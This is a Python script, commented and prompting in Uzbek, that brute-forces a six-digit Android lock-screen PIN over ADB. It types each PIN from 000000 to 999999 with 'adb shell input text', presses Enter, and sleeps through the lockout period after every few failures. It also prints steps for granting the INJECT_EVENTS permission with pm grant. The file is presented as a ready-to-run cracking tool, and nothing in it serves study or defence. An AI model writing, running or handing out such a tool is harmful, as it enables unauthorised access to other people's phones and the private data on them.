import subprocess
import time
import sys
import os

def get_adb():
    """adb mavjudligini tekshirish va yo‘q bo‘lsa so‘rash"""
    try:
        subprocess.run(["adb", "version"], capture_output=True, check=True)
        return "adb"
    except:
        print("\n❌ ADB topilmadi. Iltimos, adb.exe ning to‘liq yo‘lini kiriting:")
        print("Masalan: C:\\platform-tools\\adb.exe")
        path = input("Yo‘l: ").strip().strip('"')
        if os.path.isfile(path):
            return path
        print("❌ Fayl topilmadi.")
        return None

def wait_for_device(adb):
    """Telefon to‘g‘ri ulangunicha kutish"""
    while True:
        try:
            result = subprocess.run([adb, "devices"], capture_output=True, text=True, timeout=10)
            lines = result.stdout.strip().split('\n')[1:]  # birinchi qatorni tashla
            for line in lines:
                if line.strip():
                    parts = line.strip().split()
                    if len(parts) >= 2 and parts[1] == "device":
                        print("✅ Telefon tayyor.")
                        return True
            print("❌ Telefon topilmadi. Kabelni tekshirib, Enter...")
            input()
        except Exception as e:
            print(f"❌ Xatolik: {e}. Qayta urinish...")
            input()

def check_inject_events(adb):
    """INJECT_EVENTS ruxsatini tekshirish va yo‘q bo‘lsa yo‘l-yo‘riq ko‘rsatish"""
    try:
        test = subprocess.run([adb, "shell", "input", "keyevent", "24"], capture_output=True, timeout=5)
        if test.returncode != 0:
            print("\n⚠️  INJECT_EVENTS ruxsati yo'q. Quyidagilarni bajaring:")
            print("1. Telefonda Sozlamalar → Dasturchilar uchun → 'Отладка по USB (Настройки безопасности)' ni yoqing.")
            print("2. CMD da quyidagi buyruqlarni yozing:")
            print("   adb shell")
            print("   pm grant com.android.commands.input android.permission.INJECT_EVENTS")
            print("   exit")
            input("\n➡️  Ruxsat berilgandan so'ng Enter ni bosing...")
            return check_inject_events(adb)  # qayta tekshirish
        else:
            return True
    except Exception as e:
        print(f"⚠️  Ruxsatni tekshirishda xatolik: {e}")
        return False

def wake_screen(adb):
    """Ekranni yoqish (agar o‘chik bo‘lsa) va parol maydonini faollashtirish"""
    subprocess.run([adb, "shell", "input", "keyevent", "26"], stderr=subprocess.DEVNULL)  # Power
    time.sleep(0.5)
    # Ba'zi telefonlarda ekranni faollashtirish uchun swipe kerak bo‘lishi mumkin
    # subprocess.run([adb, "shell", "input", "swipe", "500", "500", "500", "500"], stderr=subprocess.DEVNULL)

def main():
    print("=" * 50)
    print("    6-XONALI TELEFON PAROL BRUTEFORCE DASTURI")
    print("=" * 50)

    adb = get_adb()
    if not adb:
        sys.exit(1)

    print(f"\n🔧 ADB: {adb}")
    if not wait_for_device(adb):
        sys.exit(1)

    if not check_inject_events(adb):
        sys.exit(1)

    # Sozlamalar
    try:
        pin_length = 6  # 6 xonali
        n = int(input("\n🔢 Necha xatodan keyin bloklanadi? (masalan, 5): ") or "5")
        block_time = int(input("⏱️  Bloklanish vaqti (sekundlarda, masalan 30): ") or "30")
    except ValueError:
        print("⚠️  Noto‘g‘ri qiymat, standart n=5, block_time=30 ishlatiladi.")
        n, block_time = 5, 30

    attempt = 0
    total_pins = 10**pin_length  # 1 000 000
    print(f"\n🚀 {total_pins} ta PIN sinab ko‘riladi. Boshlanmoqda...\n")

    for pin in range(0, total_pins):
        pin_str = str(pin).zfill(pin_length)  # 000000, 000001, ...
        print(f"🔑 Urinish #{attempt+1}: {pin_str}")

        # Ekranni yoqish (har safar emas, lekin xatolik bo‘lsa foydali)
        wake_screen(adb)

        # Parolni yozish
        try:
            subprocess.run([adb, "shell", "input", "text", pin_str], check=True, timeout=5)
        except subprocess.CalledProcessError as e:
            print(f"❌ Parol yozishda xatolik: {e}")
            print("Telefon ekrani o‘chik yoki parol maydoni ochiq emas. Tekshirib, qayta urinish uchun Enter...")
            input()
            continue  # shu PINni qayta urinish
        except Exception as e:
            print(f"❌ Kutilmagan xatolik: {e}")
            break

        # Enter tugmasi
        try:
            subprocess.run([adb, "shell", "input", "keyevent", "66"], check=True, timeout=5)
        except Exception as e:
            print(f"❌ Enter bosishda xatolik: {e}")
            break

        attempt += 1

        # Bloklanish vaqti (har n ta urinishda)
        if attempt % n == 0 and attempt < total_pins:
            print(f"\n⏸️  {n} ta urinish bajarildi. Telefon {block_time} sekundga bloklanadi...")
            time.sleep(block_time)
            print("▶️  Davom etamiz.\n")

        # Ixtiyoriy: PIN topilganligini tekshirish (masalan, ekran o‘zgarganini kuzatish)
        # Bu murakkab, hozircha qoldiramiz. Agar to‘g‘ri PIN kiritilsa, telefon ochiladi va dastur to‘xtaydi.

    print("\n✅ Dastur tugadi. Agar PIN topilgan bo‘lsa, telefon ochilgan bo‘lishi kerak.")
    input("Yopish uchun Enter ni bosing...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n🚫 Foydalanuvchi tomonidan to‘xtatildi.")
        sys.exit(0)

